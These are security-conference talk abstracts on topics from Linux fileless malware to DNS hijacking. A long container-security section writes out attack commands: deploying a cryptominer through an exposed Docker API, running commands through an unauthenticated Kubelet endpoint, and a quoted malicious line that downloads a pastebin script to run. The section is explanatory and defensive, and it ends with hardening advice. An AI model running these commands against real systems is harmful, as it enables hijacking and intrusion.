## <a name="Fileless+Malware+Infection+and+Linux+Process+Injection+in+Linux+OS"></a>Fileless Malware Infection and Linux Process Injection in Linux OS
by アドリアン ヘンドリック - Hendrik Adrian - @MalwareMustDie

Recent development of the exploitation with file-less method is also affecting the Linux platform too. The process injection and file-less methods used for malicious code execution on some post exploitation tools for Linux are supported to perform those operations. This trend may affect many internet of services and things that can trigger a wider and multiple incidents for more damage, so we may need to re-assess again current security readiness on protecting these platform.

In this presentation we would like to discuss several information, methods of the file-less infection and Linux process injection in the recent  trends from the blue-teamer perspective, following by the summary on their usage the way we spotted them in some public incidents. Along with the most applicable methods that may can help to forensics such cases, to help the fellow incident response operatives on handling such cases.

The information shared in this presentation is set on TLP AMBER.

## <a name="Tiplines+Today"></a>Tiplines Today
by harlo

Nowadays, the majority of US-based newsrooms rely on primarily consumer-facing applications to facilitate secure communications with sources. Usage of tools like Signal, WhatsApp, Threema, and others, have spiked in usage as the most state-of-the-art way to ensure confidential conversations with at-risk leakers and whistleblowers. Documents flood newsrooms, sometimes in gigabytes at a time, and journalists need tools to interrogate that data in relative safety from device compromise, legal interception, all while getting the job at the accelerated speed of the news cycle. Let's explore how these tools, from both a technical and behavioral usage standpoint, *make the news*. Sometimes in a good way, when a story comes out after months of clandestine collaboration with sources, and toiling over data that needs to be interrogated; sometimes in a bad way, when sources get burned, or organizations endanger themselves.

With this talk, I aim to explain a theoretical bridge between hackers and other technologists; and the a special group of end-users (journalists and their sources) who are, often without their prior knowledge, at the complete mercy of tools they barely understand under-the-hood. This talk should be as satisfying for hackers as it will be for folks who love to hear spicy stories about the "sausage gets made" in contemporary newsrooms.

## <a name="The+Glitch+In+The+Matrix"></a>The Glitch In The Matrix
by Marion

Compared to the hordes of code reviewers and review tools that skim through pristine source code with every release cycle, the attention binary output gets from security engineers is limited. And why would security folks bother, bugs are all human-made; or, are they? Honestly, in reality, most are. Modern compilers and build setups are rather unlikely to accidentally introduce flaws into binaries, let alone security relevant flaws. Except, well, if an attacker gets her hands onto the build chain...
Now, it has been established, that compromised compilers can introduce bugs to output binaries; but really, how stealthy can this be? How small of a change can an attacker plant, and still create a security vulnerability? And which means of detection do we have for such glitches in the matrix? Shall we ask Neo?

## <a name="New+Tales+of+Wireless+Input+Devices"></a>New Tales of Wireless Input Devices
by Matthias Deeg, Gerhard Klostermeier

In our talk, we will present new security tales and vulnerabilities of wireless mice, keyboards, and presenters using 2.4 GHz radio communication that we have collected over the last two years.

In 2016, we published the results of our research project "Of Mice and Keyboards: On the Security of Modern Wireless Desktop Sets" and publicly disclosed several security vulnerabilities in wireless desktop sets using AES encryption of different manufacturers. In the same year, Bastille Research independently published security vulnerabilities in wireless mice and keyboards of different manufacturers, too. As time went by, we have learned more about the (in)security of further wireless input devices like mice, keyboards, and presenters using different 2.4 GHz radio-based technologies, and want to share our experiences and gained knowledge concerning these devices.

In our talk, we want to present answers to unanswered questions of our previous wireless desktop set research, raise the awareness of security issues and practical attacks against vulnerable wireless input devices, and tell some interesting tales.

by Zoz

Networked and connected vehicles have the same network attack surface as other IoT devices, but are also heavily reliant on sensor inputs and the need for split second decision making under uncertain conditions, making them suffer a unique set of vulnerabilities even when network attacks are discounted. In this session the state of automated vehicle technology will be presented with a focus on the attack surface presented by vehicles' sensor and control logic suites, and the potential failure modes that could be exploited by malicious hackers and criminals.

## <a name="Say+Cheese+-+How+I+Ransomwared+your+DSLR+Camera"></a>Say Cheese - How I Ransomwared your DSLR Camera
by Eyal Itkin

It's a nice sunny day on your vacation, the views are stunning, and like on any other day you take out your DSLR camera and start taking pictures. Sounds magical right? But when you get back to your hotel the real shock hits you: someone infected your camera with ransomware! All your images are encrypted, and the camera is locked. How could that happen?

In this talk, we show a live demo of this exact scenario. Join us as we take a deep dive into the world of the Picture Transfer Protocol (PTP). The same protocol that allows you to control your camera from your phone or computer, can also enable any attacker to do that and more. We will describe in detail how we found multiple vulnerabilities in the protocol and how we exploited them remotely(!) to take over this embedded device.

But it doesn't end here. While digging into our camera, we found a reliable way to take over most of the DSLR cameras without exploiting any vulnerability at all. We simply had to ask our camera to do that for us, and it worked.

This is the first vulnerability research on the Picture Transfer Protocol, a vendor agnostic logical layer that is common to all modern-day cameras. As DSLR cameras are used by consumers and journalists alike, this opens up the door for future research on these sensitive embedded devices.

## <a name="DOS+Software+Security%3A+Is+there+Anyone+Left+to+Patch+a+25-year+old+Vulnerability%3F"></a>DOS Software Security: Is there Anyone Left to Patch a 25-year old Vulnerability?
by Alexandre Bartel

Abstract. DOS (Disk Operating System) systems were developed in the
1970s and are still used today, for example in some embedded systems,
management applications or by the gaming community. In this article
we will study the impact of the (lack of) security of DOS applications
on modern systems. We will explain in detail the vulnerability of the
CVE-2018-20343 which affects the Build Engine - a 3D engine - and which
allows arbitrary code execution. We show that such vulnerabilities can
be found in seconds using state-of-the-art fuzzers. Often, running a DOS
applications today means running it within an emulator such as DOSBox.
Such emulators should limit the interaction between the DOS application
and the host OS. Unfortunately, we also show how DOSBox directly
allows emulated applications to access the host file system, thus allowing
to compromise the host machine by changing login scripts for instance.
While this kind of attack usually requires a user action (login, reboot, etc.)
to execute the malicious code, we further show, by explaining CVE-2019-12594, 
that even immediate arbitrary code execution can be achieved by
bypassing mitigation techniques such as DEP or ASLR. Finally, we will
describe how software vendor are (or not) patching such vulnerabilities
in DOS applications they still sell today.

by Kostiantyn Korsun

Since 2014 Ukraine is under cyberwar. 
Energy grid attack BlackEnergy switched off electricity for 230,000 people for 6 hours. NotPetya attack effected ~30% of Ukrainian economy. Airports, railways, banking system, media, critical infrastructure had been attacked by Russian cyber groups (Telebots, BadRabbit, GrayEnergy).
But have those attacks strengthened national cybersecurity system of Ukraine?
Ukrainian cyber activists (hacktivists) checked that and published some shocking results.
This activity got the name #FuckResponsibleDisclosure (#FRD)
My talk is a historical retrospective of #FRD: when and how it started, what emotions it caused in Ukraine, how officials and resources’ owner communicated with hacktivists and others. How #FRD influenced on national cyber security and what local Cybersec-community thinks on #FRD.

## <a name="Exploiting+bug+report+systems+in+the+game+industry"></a>Exploiting bug report systems in the game industry
by Andreia Gaita

In the world of development, what do you do when you run into a bug in the library, framework, or middleware you're using? You submit a bug report and describe the steps. The companies providing you with the software expect and encourage you to send in repro code, but the bigger the system, the more complex the code needs to be to reproduce the problem. In the case of game development, the expectation is that when you find a bug, you submit a complete test project that exemplifies the problem, so that test teams can reproduce it. What can these test projects contain? How are they tested by companies developing game engines and middleware? What potential exploitation venues does this open?

There are unique conditions in the game industry that make it particularly vulnerable to certain types of attacks, but its uniqueness also makes it somewhat of a puzzle to the rest of the tech industry. In this talk, we'll go through some of the particulars of how game development works, and how these practices and bug reporting systems can be exploited to gain access to the core of development teams across the game industry.

## <a name="Beyond+Windows+Forensics+with+Built-in+Microsoft+Tooling"></a>Beyond Windows Forensics with Built-in Microsoft Tooling
by Thomas Fischer

Microsoft has slowly been introducing tools to help organisations better manage and troubleshoot Windows performance and issues; these are now entirely integrated into Windows. To improve performance and troubleshooting capabilities, Microsoft introduced System Resource Usage Monitor (SRUM) in Windows 8 and beyond. PowerShell has become the default “command line” management tool for windows administrators. These tools provide both a wealth of information into what has happened and is present on the system.

For Forensics and even Incident Response, these tools are now a go to built-in option to bootstrap and drive the forensics process including opening access to artefacts that overzealous user or even a “smart” attacker has removed. SRUM for instance can provide data points ranging from network to process activitiy providing insight into what, who, when and how an attacker or malicious process introduced itself into the environment. 

This talk will help the participant build the foundations to identify which built in tools can assist in the Windows Forensics process and the data points that are available as well as examine how services such as SRUM can be used to extract key data points to provide information for incident response or threat hunting activities.

## <a name="Defeating+Bluetooth+Low+Energy+5+PRNG+for+fun+and+jamming"></a>Defeating Bluetooth Low Energy 5 PRNG for fun and jamming
by Damien Cauquil

Bluetooth Low energy version 5 has been published in late 2016, but we still have
  no sniffer supporting this specific version (and not that much compatible devices
  as well). The problem is this new version introduces a new channel hopping algorithm
  that renders previous sniffing tools useless as devices can no longer be attacked
  and connections analyzed. This new algorithm is based on a brand new pseudo-random
  number generator (PRNG) to provide better collision avoidance while kicking out
  all of our good old sniffing tools.

  Unless some random hacker manages to break this not-that-strong PRNG and upgrades
  his BLE sniffing tool to support this algorithm ;). In this talk, we will explain
  why this PRNG is vulnerable and how it can be easily defeated to sniff and jam
  communications between two BLE 5 devices. A new version of BtleJack will be
  released during this talk, providing an efficient way to sniff BLE 5 connections
  to our fellow IoT hacker family.

## <a name="Who+contains+the+containers"></a>Who contains the containers
by Emilien, Ioana Andrada

# Who contain the containers ?

## introduction

Today it is extremely easy to deploy micro-services using containers technologies. And as usual for every easy-to-deploy technologies, people have tendencies to not using common sense before using them: You are one-click away from being easily compromised !

In this talk we will present most common vulnerabilities and unsecure configurations found on containers technologies and how to exploit them. Then we will try to figure out if we can find actually compromised containers on Internet. Finally we will describe recommendations on how to secure and how to detect attacks against container technologies.

## Attacks against container technologies

When we speak about container technologies, two main components may be subject to attacks:

 * Containers technologies (docker, rkt, Solaris containers, Microsoft Containers ...)
 * Container orchestration tools (kubernetes, apache meos, docker swarm, docker data center)

Another important part of the environment is the storage container (clusterHQ, BlockBridge,EMC...) but it can be attacked through the orchestration engine so we will not describe them with too much details in this talk.

Also it is important to highlight the fact that most cloud service providers provide their own implemantation of orchestration tools, which can be targeted as well.


### exploit vulnerabilities to break out of containers

Worst scenario for containers is the possibility for a malicious or compromised container to escape and attack the host system. Of course it happened with a vulnerability on runC (CVE-2019-5736: runc container breakout).

Vulnerability was discovered by Adam Iwaniuk and Borys Popławski and affect most of the containers softwares and a proof-of-concept is available: https://github.com/Frichetten/CVE-2019-5736-PoC

As this vulnerability is probably the most critical, others are not to be ignored:
 
 * CVE-2018-11757 (Docker): a Docker action inheriting the Docker tag openwhisk/dockerskeleton:1.3.0 (or earlier) may allow an attacker to replace the user function inside the container if the user code is vulnerable to code exploitation,
 * CVE-2018-8115 (Docker for Windows): A remote code execution vulnerability exists when the Windows Host Compute Service Shim (hcsshim) library fails to properly validate input while importing a container image,
 * Vulnerabilities on "rkt enter" commands (CVE-2019-10144, CVE-2019-10145 and CVE-2019-10146): discovered by Yuval Avrahami, those vulnerabilities could be used to escape to the host system by putting traps on modified binaries in a compromised container (https://www.twistlock.com/labs-blog/breaking-out-of-coresos-rkt-3-new-cves/)

### abusing APIs

APIs are great to automate admin tasks ... or compromising at a scale. If not properly secured, API access can be used to start, delete or configure containers or the host sytem. 

Here is some attack example abusing APIs:

 - Docker: create container via API 

Docker API is exposed on port 2375/TCP or 2376/TCP (SSL). If default configurtion is used (who do that ? :D) a simple POST request give us the possibility to deploy and start a Docker Image. The image will be downloaded from Docker Hub automatically...

We can use a crafted HTTP request or just the docker client as shown bellow:

`docker -H target:2376 run --restart unless-stopped --read-only -m 50M -c 512 bitnn/alpine-xmrig -o POOOOL  -u WALLET -p X -k`



 - Kubernetes: Unauthenticated endpoint on Kubelet (port 10250) to perform `exec` command

The exploitation take 2 steps, first a POST request to the exec endpoint:

`POST "https://target:10250/exec/<namespace>/<podname>/<container-name>?command=whoami&input=1&output=1&tty=1"`

Then a GET request (SPDY capable client) using location header from the response of the previous request

`wscat -c "https://target:10250/cri/exec/XxXxXxXx" --no-check`

A single GET request is used to list the available containers on the target:

`GET "https://target:10250/pods"`



Those two examples can be reproduced against most orchestration tools of the API endpoints are not properly secured.


### compromising containers repositories

Supply-chain attacks can happen on container image repositories. An attacker could successfully push an update to a well-known container image and just wait for victims to deply/update. Or even creating an account on the repository (let say `Docker Hub` for example) and convincing people to use their images.

That is exacly what happen recently with Zuulu2 botnet (see https://github.com/docker/hub-feedback/issues/1809). Somebody pushed a `cryptomining` image on Docher Hub and exploit weak configuration to download and run the container image. The image is also used to discover new potential targets.




## Is it legit ?

While working on another project, we stumbled accross some strange containers online, so we asked ourself if we could find more of those suspicious stuff. We mostly concentrated on Docker as it is the most popular (so the most targeted)

To do that, we developped some script to extract information on available containers online via their exposed API endpoints and parse the extracted data to highlight potentially "unwanted" containers. Identifying online API is done by leveraging internet scanning services (Shodan, Onyphe and Censys).

Another technique consist of downloading unverifed images (to limit the scope of the investigation, we look for modified `alpine` images) from container images repositories and analysing startup scripts of those images. A good tool to perform this task for Docker images is Dive (https://github.com/wagoodman/dive). 

In this part, we will present some interesting containers we found running online and drill-down to the TTPs used by the TA behind the supposed infection. Here is some examples (all Docker):

### Xmrig image

Suspicious level: low

We found some docker image used for cryptocurrency mining which may be suspicious because it is probably the least efficient way to do mining... but we never know.

### Nice wget you got there

Suspicious level: high

Ok this time we are sure it is malicious : `chroot /mnt /bin/sh -c 'yum install wget -y;apt-get install wget -y;rm hrfbyyu.sh;wget https://pastebin.com/raw/h7HiT3uR ...` 

So when the image it started, it will install wget via `yum` OR `apt-get`, then download and execute a script from `pastebin` ... does not really look legit ...

The script itself is base64 encoded and contains update and persistence mechanisms for Linux and cryptomining activities.

### Xulu botnet

Suspicious level: high

Some month ago, a user named `zuulu2` on Docker Hub uploaded malicious images perfoming scanning of other potential victims and cryptomining activities. It spread exploiting open Docker API. Malicious images were removed from Docker Hub.

By getting the list of running or available containers, we can see that the zuulu2 images are still running on several servers.

### Dockerfile: CMD ["/run.sh"] 

We identified this image posted on Docker Hub 6 month ago. User only uploaded one image and the description was just `CMD ["/run.sh"]`. By using Dive, we identified modifications from the base image (alpine):

 - adding a user named `miner`
 - downloading and compiling xmrig
 - starting the mining process (XMR)




## Containers security
 
The security of a container does not resume only to the container itself. A container is based on an image, which contains all the files required to run. But what if the used image is vulnerable or it has some configuration defects,embedded clear text secrets or it might contain embedded malware, intended to do something else than the initial purpose.

Many images for containers are stored usually in a central location because they are easy to control, reuse, share across the community. Do we trust those  registries or are we sure that the connection to those registries is secure?

Orchestration tools are great for managing the containers. They pull the images from registries , deploy images into containers and manage the running containers. But is it always clearly defined who has access or not?Do we trust the orchestrator node in the cluster? Is it properly separated the network traffic between the containers in the orchestrator configuration ?

Multiple containers share the same OS kernel instance.Each operating system has a container runtime, which coordinates different OS components in such a way that each container sees only its dedicated resources and it is isolated from other containers running at the same time. Anyone with access to the kernel root account can see and access all containers.The attack surface level on the host OS is pretty big. The attacker can attempt to exploit host OS vulnerabilities, tampering file systems or gain priviledged user access rights.

 
### Hardening

When you think at hardening a container, you have to take into consideration all the components that make a container up and running. And as there is no clear and concrete security for the containers, we have to find measures to harden every component.
We will present best practices for each component.

#### Container Images Security
* use only signed images from trusted registry
* visibility into all layers of the image
* validation of the configuration of the images, regular patching updates
* constant monitoring 

#### Host Security
* harden the host
* always patch
* grant authorization wisely,by controlling user access
* separate partitions for containers
* audit all the container's activity

#### Container Runtime Security
* namespaces - what a container can see and to what extenct can interract with each oter internally
* cgroups - how much of shared kernel and system resources a container will consume
* seccomp - secure computing mode
* process restrictions
* device and file restrictions

#### Orchestration environment security
* limit direct access
* fine-grained-access control rules
* administrative boundaries
* resource quota
* safe management and distribution of secrets
* encrypt data exchange


### Auditing

It is important to continously scan your containers for vulnerabilities of various kinds,including bugs,inadequate authentication and authorization ,embedded secrets and misconfiguration. 
Auditing containers can be challenging, on one side because of their architecture and on the other side the short lifetime and the density of the containers deployed. It becomes really difficult to track what exactly was deployed.

On your host audit regular Linux file system and system calls and also log who is running the container service. Add audit rules for the container service using **auditd**.
Also make sure you have a container-native log collection agent on your host , which provides automatic collection and processing of container logs.


### Monitoring

Monitoring your container activity it is essential in identifying security incidents and providing audit trails.
Containered environments require logging at multiple layers - the host, the container orchestrator and the container itself. 
* monitor and capture host logs
* monitor the container orchestration system used like Docker Swarm, Kubernetes, Apache Mesos and Hashicorp Nomad
* ensure adequate log information at the containers, by setting the log level in your container

#### Tools

There are different tools out there, which might help you in monitoring your containered environment, but this is not done easily. 

* docker remote API - The docker engine client provides an API, through which you collect basic monitoring function of Docker containers 
* container advisor(cAdvisor) - it consists of a container, which can collect,process,aggregate and export information related to running containers.
* prometheus - monitoring tools that can be used to observe metrics and raise alerts, based on the applied alerting rules over the input data. Everything can be displayed in a UI dashboard,based on Grafana


## Conclusion

Micro-services are the future they say. Sure thing for cyber-criminals ! As those technologies will be more and more used and most probably in the cloud, SOC teams need to start worrying about the potential impact and how to face those new threats. It will take time. Oh and we did not spoke about serverless services like AWS Lambda ...

## <a name="DNS+On+Fire"></a>DNS On Fire
by Rascagneres Paul, Warren Mercer

Cisco Talos identified malicious actors targeting the DNS protocol successfully for the past several years. In the presentation, we will present 2 threat actors we have been tracking.

The first one developed a piece of malware, named DNSpionage, targeting several government agencies in the Middle East, as well as an airline. During the research process for DNSpionage, we also discovered an effort to redirect DNSs from the targets and discovered some registered SSL certificates for them. We identified multiple countries targeted by this redirection. On 22 January 2019, the US DHS published a directive concerning this attack vector. In this presentation, we will present the timeline for these events and their technical details. 

The second actor is behind the campaign we named “Sea Turtle”. This actor is more advanced and more aggressive than the previous one. They do not hesitate to target directly registrars and one registry. The talk will present the 2 actors and the methodology used to target the victims.

## <a name="Practical+Incident+Response%2C+With+Automation+and+Collaboration+Inside"></a>Practical Incident Response, With Automation and Collaboration Inside
by Saad Kadhi

Investigating cyberattacks is now the norm, instead of the exception. The threat landscape keeps changing at a worrying pace while security analysts have to deal with growing complexity, learn new technologies and continuously adapt to rapidly evolving IT environments.

To ease up their burden and enable them to give the best out of themselves in order to fulfil their important mission, while avoiding the so-called analyst fatigue, they should not be asked to master copying and pasting between different tools and interfaces to get their job done. They should not be asked to follow procedures without clearly understanding them and contributing into their improvement.

Humans have brains, even if the deafening speeches about artificial intelligence and machine learning would want us to believe otherwise. It’s more than time to place humans back at the centre and offer them solutions that get out of their way yet support them in their incident response journey, to learn, adapt, and collaborate at every stage. We are social animals after all, aren’t we?

This is exactly what [MISP Project](https://misp-project.org) and [TheHive Project](https://thehive-project.org) are all about, providing not only free, open source products to sustain the daily activities of blue teams around the globe, but products that actually work and integrate with one another to cover the full spectrum of incident response, ranging from detection to recovery and cyber threat intelligence production and sharing.

So come join us for three hours of **practical** incident response where **automation** and **collaboration** play a paramount role, using MISP, the *de facto* standard for threat sharing, TheHive, a Security Incident Response Platform and Cortex, a powerful analysis and active response engine.

## <a name="Introduction+to+WHIDS+an+Open+Source+Endpoint+Detection+System+for+Windows"></a>Introduction to WHIDS an Open Source Endpoint Detection System for Windows
by Quentin JEROME

[WHIDS](https://github.com/0xrawsec/whids) is one of the first open source endpoint detection solution for windows designed with fast Incident Response in mind. It comes with a powerful rule definition format known as [Gene](https://github.com/0xrawsec/gene) allowing one to achieve complex detection primitives. One of its strengths compared to other approaches is that it dumps artifacts (process, file, registry) based on the criticality of the events detected. This allows one to collect artifacts as close as possible of the alert generated. This approach reduces considerably the incident response process while putting the focus on artifact analysis automation. 

The purpose of this workshop will be twofold. In the first place I will introduce the tool and the rule definition format (30 to 45 mins). In a second part some hands-on with the attendees will be made (the rest of the time). The first part of the hands-on will cover simple WHIDS deployment and tweaking. Then comes a realistic case study. In the first place we will study a technique (or a malware) common to everyone and walk through all the steps leading to the final rule creation. Then the attendees will study on their own a technique or malware sample of their choice and build the appropriate detection rule(s). In the last part we will discuss on the possible implementations in a production environment.
